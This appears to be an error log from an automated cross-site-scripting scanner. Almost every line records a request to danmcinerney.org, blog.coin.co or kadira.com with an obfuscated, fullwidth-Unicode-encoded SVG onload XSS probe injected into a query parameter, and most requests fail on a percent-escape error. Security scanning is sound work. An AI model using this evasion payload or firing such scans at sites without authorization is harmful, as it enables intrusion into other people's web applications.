Error opening http://danmcinerney.org/?id=123&md5=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?id=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&md5=aa0f7a82b97136fb7d021a4b0086c56c: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?id=99&md5=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?id=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&md5=0dc5be2ac4101c8fcf57a6f4532574e3: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?id=56&md5=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?id=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&md5=6301dbb5dbdc0e89d6708fae45f2488b: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?id=1&md5=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/wp-content/themes/responsive/core/js/responsive-scripts.min.js?ver=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/wp-content/themes/responsive/core/js/jquery.placeholder.min.js?ver=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?id=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&md5=8f7f4c1ce7a4f933663d10543562b096: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?id=164&md5=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/about/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/about/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/wp-includes/js/comment-reply.min.js?ver=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-exploit-home-routers-for-anonymity/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-kick-everyone-around-you-off-wifi-with-python/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://danmcinerney.org/how-to-kick-everyone-around-you-off-wifi-with-python/?replytocom=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/wp-includes/js/jquery/jquery.js?ver=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/wp-includes/js/jquery/jquery-migrate.min.js?ver=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://sandbox.coin.co/donationQRCode/connector?pixsize=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/wp-includes/js/jquery/jquery.js?ver=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/wp-includes/js/jquery/jquery-migrate.min.js?ver=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co/?p=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://sandbox.coin.co/donationQRCode/connector?pixsize=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://blog.coin.co: HTTPConnectionPool(host='blog.coin.co', port=80): Max retries exceeded with url: / (Caused by <class 'socket.error'>: [Errno 104] Connection reset by peer)
Error opening http://blog.coin.co/2014/06/farm-truck-philly-uses-coin-co-mobile-software/: HTTPConnectionPool(host='blog.coin.co', port=80): Max retries exceeded with url: /2014/06/farm-truck-philly-uses-coin-co-mobile-software/ (Caused by <class 'socket.error'>: [Errno 104] Connection reset by peer)
Error opening http://blog.coin.co/2014/05/major-u-s-law-firm-mclaughlin-stern-accepts-bitcoin/: HTTPConnectionPool(host='blog.coin.co', port=80): Max retries exceeded with url: /2014/05/major-u-s-law-firm-mclaughlin-stern-accepts-bitcoin/ (Caused by <class 'socket.error'>: [Errno 104] Connection reset by peer)
Error opening http://sandbox.coin.co/donationQRCode/connector?pixsize=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CAT=Notas+de+prensa: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?IDcat=12&CAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/catalogo_cat.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/blog.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CAT=Notas+de+prensa: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/blog.php?IDcat=12&CAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://www.kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CAT=Ergonom?a: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?IDcat=10&CAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?pageNum_Recordset1=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&totalRows_Recordset1=24: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?pageNum_Recordset1=1&totalRows_Recordset1=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Junio+2014: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=June+2014&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Mayo+2014: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=May+2014&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Abril+2014: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=April+2014&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Abril+2013: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=April+2013&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Septiembre+2012: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=September+2012&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Julio+2012: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=July+2012&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Junio+2012: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=June+2012&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Mayo+2012: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=May+2012&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Noviembre+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=November+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Octubre+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=October+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Septiembre+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=September+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Agosto+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=August+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Julio+2010: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=July+2010&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Marzo+2009: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=March+2009&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Noviembre+2007: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=November+2007&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CA=Abril+2006: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?DAT=April+2006&CA=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog_post.php?IDblog=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?pageNum_Recordset1=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&totalRows_Recordset1=12&IDcat=12&CAT=Notas+de+prensa: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?pageNum_Recordset1=1&totalRows_Recordset1=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDcat=12&CAT=Notas+de+prensa: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?pageNum_Recordset1=1&totalRows_Recordset1=12&IDcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&CAT=Notas+de+prensa: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/blog.php?pageNum_Recordset1=1&totalRows_Recordset1=12&IDcat=12&CAT=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=19: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=26&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=18: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=26&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=17: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=26&IDfam=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e: Invalid percent-escape sequence: 'u0'
Error opening http://kadira.com/catalogo_subcat.php?IDsubcat=%u0022%uff1e%uff1csvg/onLoAd=pRoMpT(98)%uff1e&IDfam=16: Invalid percent-escape sequence: 'u0'
